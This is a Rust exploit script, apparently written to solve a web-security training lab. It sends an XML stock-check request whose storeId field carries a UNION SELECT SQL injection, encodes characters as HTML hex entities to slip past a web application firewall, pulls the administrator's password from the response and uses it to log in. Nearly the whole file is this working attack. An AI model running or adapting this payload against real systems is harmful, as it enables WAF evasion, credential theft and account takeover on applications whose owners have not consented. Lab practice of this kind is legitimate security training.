use sql_injection::{
    HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, login_as_administrator,
};

fn main() {
    let args = generate_clap_parser();

    let lab_url = args.lab_url.as_str().trim_end_matches("/");

    logger::info("Making a POST request to /product/stock");

    // I have encoded the following characters with HTML Hex Entity enocding to bypass WAF
    // `U` -> &#x55;
    // `S` -> &#x53;
    // `'` -> &#x27;
    let payload = r#"<?xml version="1.0" encoding="UTF-8"?>
        <stockCheck>
            <productId>4</productId>
            <storeId>1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;</storeId>
        </stockCheck>"#;

    println!("[!] Using the following payload: ");
    println!("{}", payload);

    let response = HTTP_CLIENT
        .post(format!("{}/product/stock", lab_url))
        .body(payload)
        .send()
        .expect("[-] Failed to build the request");

    if response.status() == 200 {
        logger::success("Made the request successfully");

        let administrator_password: String = response
            .text()
            .expect("[-] Failed to extract body")
            .lines()
            .collect::<Vec<&str>>()[1]
            .to_string();

        logger::success(
            format!("Got the Administrator Password: {}", administrator_password).as_str(),
        );

        login_as_administrator(lab_url, administrator_password.trim().to_string());
    } else {
        println!("{}", response.text().unwrap());
        panic!("{}", logger::error_return("Failed to make the request"))
    }

    check_is_lab_solved(lab_url);
}
